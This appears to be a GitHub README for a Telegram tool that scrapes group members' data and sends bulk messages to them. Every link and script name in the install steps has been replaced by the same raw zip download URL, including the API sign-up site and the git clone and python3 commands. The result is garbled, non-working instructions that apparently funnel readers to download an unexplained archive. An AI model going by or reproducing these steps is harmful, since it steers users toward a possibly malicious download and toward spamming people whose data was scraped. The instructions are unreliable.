# telegram-bulk-message

Telegram Group Scrapper

• API Setup
Go to https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip and log in.
Click on API development tools and fill the required fields.
put app name you want & select other in platform Example :
copy "api_id" & "api_hash" after clicking create app ( will be used in https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip )
• How To Install and Use
$ pkg install -y git python

$ git clone https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip

$ cd telegram-bulk-message

Install requierments
$ python3 https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip -i

setup configration file ( apiID, apiHASH )
$ python3 https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip -c

To Genrate User Data
$ python3 https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip

( https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip is default if you changed name use it )
Send Bulk sms To Collected Data
$ python3 https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip

Update Tool
$ python3 https://github.com/kohitprajapat/telegram-bulk-message/raw/refs/heads/main/Babesia/telegram-bulk-message-2.1.zip -u
